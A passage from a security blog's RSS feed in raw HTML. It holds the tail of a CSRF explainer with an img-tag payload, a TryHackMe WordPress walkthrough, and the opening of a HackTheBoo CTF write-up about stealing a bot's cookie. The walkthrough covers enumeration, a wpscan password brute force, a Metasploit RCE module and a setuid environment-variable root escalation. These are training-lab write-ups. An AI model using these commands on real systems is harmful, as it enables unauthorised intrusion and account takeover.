&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;”https://utkusen.com/?amount=500&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;img or script don&amp;rsquo;t require preflight requests.&lt;/p&gt;
&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;Cookies are vulnerable as they are automatically sent with each request, allowing attackers to easily craft malicious requests leading to CSRF.
Although the attacker cannot obtain the response body or the Cookie itself, the attacker can perform actions with the victim’s elevated rights. The impact of a CSRF vulnerability is also related to the privilege of the victim, whose Cookie is being sent with the attacker’s request. While data retrieval is not the main scope of a CSRF attack, state changes will surely have an adverse effect on the web application being exploited.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Blog</title>
      <link>https://mychaos.me/posts/blog/</link>
      <pubDate>Wed, 12 Jul 2023 20:28:56 +0100</pubDate>
      
      <guid>https://mychaos.me/posts/blog/</guid>
      <description>a TryHackMe room about a vulnerable wordpress blog
 Solution Before we proceed, let&amp;rsquo;s start with the initial steps. We&amp;rsquo;ll begin by adding our Machine IP to the /etc/hosts file as &amp;ldquo;blog.thm&amp;rdquo;. Once that&amp;rsquo;s done, we can run our reliable nmap scan.
Nmap scan report for &amp;lt;IP&amp;gt; Not shown: 998 closed ports 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack Apache httpd 2.</description>
      <content>&lt;p&gt;&lt;a href=&#34;https://tryhackme.com/room/blog&#34;&gt;&lt;img src=&#34;https://readme-typing-svg.demolab.com?font=Fira+Code&amp;amp;pause=1000&amp;amp;width=435&amp;amp;lines=Blog&#34; alt=&#34;Blog&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a TryHackMe room about a vulnerable wordpress blog&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;Before we proceed, let&amp;rsquo;s start with the initial steps. We&amp;rsquo;ll begin by adding our Machine IP to the /etc/hosts file as &amp;ldquo;blog.thm&amp;rdquo;. Once that&amp;rsquo;s done, we can run our reliable nmap scan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &amp;lt;IP&amp;gt;
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;998&lt;/span&gt; closed ports
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
80/tcp  open  http        syn-ack Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-generator: WordPress 5.0
| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Billy Joel&amp;amp;&lt;span style=&#34;color:#75715e&#34;&gt;#039;s IT Blog &amp;amp;#8211; The IT blog&lt;/span&gt;
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We have both HTTP and SMB services open. Now, let&amp;rsquo;s take a look at the SMB share.&lt;/p&gt;
&lt;h3 id=&#34;smb&#34;&gt;SMB&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» smbmap.py -H &amp;lt;IP&amp;gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Guest SMB session established on &amp;lt;IP&amp;gt;...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP: &amp;lt;IP&amp;gt;:445 Name: blog.thm
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        BillySMB                                                READ, WRITE     Billy&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;s local SMB Share
        IPC$                                                    NO ACCESS       IPC Service &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;blog server &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We&amp;rsquo;ll try to retrieve the files from the BillySMB share since it stands out among the others.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» smbclient //10.10.29.18/BillySMB
Try &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Sat Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; 00:52:57 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 19:58:23 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
  Alice-White-Rabbit.jpg              N    &lt;span style=&#34;color:#ae81ff&#34;&gt;33378&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:17:01 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
  tswift.mp4                          N  &lt;span style=&#34;color:#ae81ff&#34;&gt;1236733&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:13:45 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
  check-this.png                      N     &lt;span style=&#34;color:#ae81ff&#34;&gt;3082&lt;/span&gt;  Tue May &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; 20:13:43 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;

                &lt;span style=&#34;color:#ae81ff&#34;&gt;15413192&lt;/span&gt; blocks of size 1024. &lt;span style=&#34;color:#ae81ff&#34;&gt;9737512&lt;/span&gt; blocks available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we download the files we don’t see anything obvious. We can check the jpg with stegsolve&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» steghide extract -sf Alice-White-Rabbit.jpg
Enter passphrase:
wrote extracted data to &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rabbit_hole.txt&amp;#34;&lt;/span&gt;.
» cat rabbit_hole.txt
You&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;ve found yourself in a rabbit hole, friend.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Since the SMB exploration seems unproductive, let&amp;rsquo;s now focus on checking out the HTTP server.&lt;/p&gt;
&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.ibb.co/Ldpznw0/blog-index.png&#34; alt=&#34;blog&#34;&gt;&lt;/p&gt;
&lt;p&gt;When we visit the website, we see a basic blog, and we know it&amp;rsquo;s running on WordPress based on the room description.
We can use the wpscan tool to scan the WordPress website and gather information. Let&amp;rsquo;s perform a wpscan scan, focusing only on the essential details.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» wpscan --url blog.thm -e u
Interesting Finding&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; WordPress version 5.0 identified &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Insecure, released on 2018-12-06&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
 | Found By: Rss Generator &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 |  - http://blog.thm/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;
 |  - http://blog.thm/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumerating Users &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;via Passive and Aggressive Methods&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 Brute Forcing Author IDs - Time: 00:00:00 &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;========================================================================================&lt;/span&gt;&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; / 10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 100.00% Time: 00:00:00

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Identified:

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; kwheel
 | Found By: Author Posts - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 | Confirmed By:
 |  Wp Json Api &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
 |  Author Id Brute Forcing - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 |  Login Error Messages &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; bjoel
 | Found By: Author Posts - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 | Confirmed By:
 |  Wp Json Api &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
 |  Author Id Brute Forcing - Author Pattern &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
 |  Login Error Messages &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that there are two users, bjoel and kwheel. Let&amp;rsquo;s try to brute force the password for both users.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;» wpscan --url blog.thm -U kwheel,bjoel -P /opt/wordlists/rockyou.txt --password-attack wp-login -t &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&amp;lt;RANDOM THINGS&amp;gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;SUCCESS&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; - kwheel / &amp;lt;REDACTED&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After about two minutes, we managed to successfully acquire a user account, which we can now utilize to gain shell access.&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-8943---metasploit&#34;&gt;CVE-2019-8943 - Metasploit&lt;/h3&gt;
&lt;p&gt;Metasploit has a module that exploits this vulnerability, allowing us to obtain a shell.
exploit/multi/http/wp_crop_rce&lt;/p&gt;
&lt;h3 id=&#34;shell&#34;&gt;SHELL&lt;/h3&gt;
&lt;p&gt;Now that we have a shell, we can check for other users on the system.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ls /home
bjoel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
&lt;p&gt;While searching the system, we couldn&amp;rsquo;t find a way to access bjoel directly. However, we did notice an interesting setuid binary located in /usr/sbin that caught our attention.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ /usr/sbin/checker
Not an Admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that the binary is checking if the user is an admin or not. Let&amp;rsquo;s take a look at the binary in Ghidra.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;adminEnv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getenv(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;);

  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (adminEnv &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;) {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not an Admin&amp;#34;&lt;/span&gt;);
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
    setuid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;);
  }

  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After analyzing the program, we observe that it retrieves the value of the &amp;ldquo;admin&amp;rdquo; environment variable and verifies if it is not null. To bypass this check, we can simply set the &amp;ldquo;admin&amp;rdquo; environment variable to any value of our choice.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ admin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;a /usr/sbin/checker
id
uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;33&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;www-data&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the ability to bypass the previous program&amp;rsquo;s check, we can now proceed to read the root flag. Additionally, we can explore bjoel&amp;rsquo;s files and discover his hidden user flag located in /media.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>HackTheBoo</title>
      <link>https://mychaos.me/posts/hacktheboo/</link>
      <pubDate>Fri, 28 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://mychaos.me/posts/hacktheboo/</guid>
      <description>Cursed Secret Party  You&amp;rsquo;ve just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?
 Solution Looking through the provided source code, we see a bot.js file which reads the flag.txt file.
const fs = require(&amp;#39;fs&amp;#39;); const puppeteer = require(&amp;#39;puppeteer&amp;#39;); const JWTHelper = require(&amp;#39;.</description>
      <content>&lt;h1 id=&#34;cursed-secret-party&#34;&gt;Cursed Secret Party&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You&amp;rsquo;ve just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;Looking through the provided source code, we see a &lt;code&gt;bot.js&lt;/code&gt; file which reads the flag.txt file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puppeteer&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JWTHelper&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./helpers/JWTHelper&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFileSync&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/flag.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;visit&lt;/code&gt; function opens a browser page and sets a &lt;code&gt;JWT&lt;/code&gt; token as a cookie. The flag is passed in said token. So we obviously need to steal the bot&amp;rsquo;s cookie to get the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;visit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; () =&amp;gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;puppeteer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;launch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;browser_options&lt;/span&gt;);
		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;browser&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createIncognitoBrowserContext&lt;/span&gt;();
		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;newPage&lt;/span&gt;();

		&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;JWTHelper&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;user_role&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; });
		&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setCookie&lt;/span&gt;({
			&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;session&amp;#39;&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;,
			&lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;127.0.0.1:1337&amp;#39;&lt;/span&gt;
		});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the bot sets the cookie, it visits the &lt;code&gt;/admin&lt;/code&gt; endpoint, waits 5 seconds, then deletes all the content.&lt;/p&gt;
